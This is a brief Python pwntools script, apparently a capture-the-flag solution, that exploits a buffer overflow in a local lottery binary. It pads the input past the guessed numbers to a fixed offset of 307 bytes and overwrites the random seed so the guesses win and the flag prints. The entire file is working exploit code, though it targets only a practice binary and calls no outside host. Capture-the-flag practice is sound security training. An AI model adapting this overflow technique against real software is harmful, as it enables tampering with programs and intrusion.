#!/usr/bin/env python3
from pwn import process, log
import struct

# Local binary path
BINARY_PATH = './lotto.bin'

# Same seed and predicted wins as before
SEED   = 0x31313131
WINS   = [27, 47, 38, 24, 34, 28]
OFFSET = 307

# Build the payload
nums_str = ' '.join(map(str, WINS))
payload  = nums_str.encode()
payload += b'A' * (OFFSET - len(nums_str))
payload += struct.pack('<I', SEED)
payload += b'\n'

# Launch locally
p = process(BINARY_PATH)

# Sync up to the prompt
p.recvuntil(b"Enter 6 numbers")

# Send our overflow payload
p.send(payload)

# Grab the flag output
flag = p.recvall(timeout=2)
log.success(f"Flag:\n{flag.decode(errors='ignore')}")
